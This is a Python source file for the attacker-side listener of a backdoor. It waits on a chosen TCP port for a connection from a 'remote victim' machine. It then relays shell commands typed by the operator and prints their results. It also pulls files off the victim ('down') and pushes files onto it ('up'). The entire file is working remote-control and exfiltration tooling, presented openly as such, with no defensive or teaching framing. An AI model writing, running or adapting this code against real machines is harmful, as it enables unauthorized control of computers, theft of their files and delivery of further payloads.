#######################
# @author: RaffaDNDM
# @date:   2022-02-27
#######################

import socket
import argparse
from termcolor import cprint, colored
import threading
import os

class Listener:
    '''
    Listener of Backdoor run on the attacker machine.

    Args:
        port (int): Port number on which Listener will work

    Returns:
        client_sd (socket.socket): Socket descriptor for communication 
                                   with the remote victim

        workin_dir (str): Working dir of the backdoor on the victim side
    '''

    def __init__(self, port):
        #Create TCP socket
        sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #Address of the server backdoor
        sd.bind(('', port))
        #Listening queue
        sd.listen(10)
        #Waiting for requests
        self.client_sd, self.client_address = sd.accept()        
        #Working dir on windows
        self.client_sd.send(b'cd\r\n')
        #Read the working dir on remote victim
        size = self.read_until_CRLF()
        self.working_dir = self.client_sd.recv(int(size)).decode('utf-8','ignore').replace('\n','')
        self.working_dir = self.working_dir.replace('\r','')


    def read_until_CRLF(self):
        '''
        Read message until \r\n

        Args:
            msg (str): Message read until \r\n

        Returns:
            msg (str): Message read without \r\n
        '''

        size = ''
        
        while True:
            size += self.client_sd.recv(1).decode('utf-8','ignore')

            if size.endswith('\r\n'):
                break

        return size[:-2]


    def send_file(self, path):
        '''
        Send a file from the attacker to the victim machine.

        Args:
            path (str): Path of the file on the attacker machine 
                        that the attacker wants to send to the 
                        victim machine
        '''

        if os.path.exists(path) and os.path.isfile(path):
            #If the file exists, send it to the remote victim machine
            with open(path, 'rb') as f:
                f_bytes = f.read()
                self.client_sd.send(f'{len(f_bytes)}\r\n'.encode()+f_bytes)
        else:
            print(f'File {path} not found')
            self.client_sd.send(b'0\r\n')


    def receive_file(self, size, name):
        '''
        Receive a file from the remote victim machine.

        Args:
            size (int): Size of the file

            name (str): Name of the file
        '''

        #Receive the file from the victim
        file_bytes = self.client_sd.recv(size)
        
        #Store it on the attacker machine
        with open(name, 'wb') as f:
            f.write(file_bytes)


    def run(self):
        '''
        Execute the backdoor.
        '''
        
        while True:
            command = input(self.working_dir+'>> ')
            cmd_list = command.split(' ')
            self.client_sd.send((command+'\r\n').encode())

            if cmd_list[0]!='up':
                #Read size of the result message
                #(if no upload command done)
                size = self.read_until_CRLF()

            if cmd_list[0]=='cd' and len(cmd_list)>1:
                #Change directory
                self.working_dir = self.read_until_CRLF()
            
            elif cmd_list[0]=='down' and len(cmd_list)>1:
                #Download a file from the remote victim machine
                #on the attacker machine
                if int(size) == 0:
                    print('No file download/found')
                else:
                    head, tail = os.path.split(cmd_list[1])
                    self.receive_file(int(size), tail)

            elif cmd_list[0]=='up' and len(cmd_list)>1:
                #Upload a file of the attacker machine 
                #on the remote victim machine
                self.send_file(cmd_list[1])

            if cmd_list[0]!='down' and cmd_list[0]!='up':
                #Print result of the terminal command executed 
                #on the victim machine
                result = self.client_sd.recv(int(size)).decode('utf-8','ignore')
                print(result)


class NoPortSpecified(Exception):
    '''
    Error raised if the user doesn't specify a valid gateway IP address
    '''
    
    pass


def args_parser():
    '''
    Parser of command line arguments
    '''

    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-port", "-p", dest="port", help="Port number of the hacker")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.port:
            raise NoPortSpecified
        
        cprint('Port:  ', 'green', attrs=['bold',], end='')
        print(f'{args.port}', end='\n\n')

    except NoPortSpecified as e :
        parser.print_help()
        exit(0)

    return int(args.port)


def main():
    port = args_parser()
    server = Listener(port)
    server.run()


if __name__=='__main__':
    main()